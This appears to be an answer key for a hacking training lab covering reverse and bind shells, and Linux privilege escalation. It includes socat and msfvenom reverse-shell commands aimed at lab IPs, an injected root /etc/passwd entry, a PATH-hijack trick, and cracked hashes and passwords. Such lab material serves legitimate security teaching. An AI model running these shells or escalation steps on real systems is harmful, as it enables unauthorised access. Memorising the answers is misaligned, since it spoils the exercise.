## Lab 01 Answers

### Part 1.1

#### Task 3: 

1) R
2) N
3) T

#### Task 4:

1) -l
2) nc 10.10.10.11 8080

#### Task 5:

1) stty cols 238
2) sudo python3 -m http.server 80

#### Task 6:

1) TCP-L:8080

#### Task 7:

1) socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
2) socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

#### Task 8:

1) mkfifo

#### Task 9:

1) This is covered in the task -- all you need to do is substitute in your own tun0 address and chosen port.
2) _
3) msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

#### Task 10:

1) exploit -j
2) sessions 10


### Part 1.2


#### Task 4:

2) polobox
3) 8
4) 4
5) autoscript.sh (on user4's desktop)
6) /etc/passwd

#### Task 5:

1) /home/user3/shell

#### Task 6:

2) vertical
3) $1$new$p7ptkEKU1HnaHpRtzNizS1
4) new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash

#### Task 7:

2) NOPASSWD 

#### Task 8:

3) -p
5) /home/user4/Desktop

#### Task 9:

2) ls
4) echo "/bin/bash" > ls
5) chmod +x ls

### Part 1.3

#### Task 1:

2) uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

#### Task 3:

1) $6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0
2) sha512crypt
3) password123

#### Task 5:

1) uid=0(root) gid=0(root) groups=0(root)

#### Task 6:

1) 11
2) apache2

#### Task 9:

1) /home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

#### Task 16:

1) mysql -h somehost.local -uroot -ppassword123

#### Task 17:

1) /etc/openvpn/auth.txt

#### Task 19:

1) no_root_squash
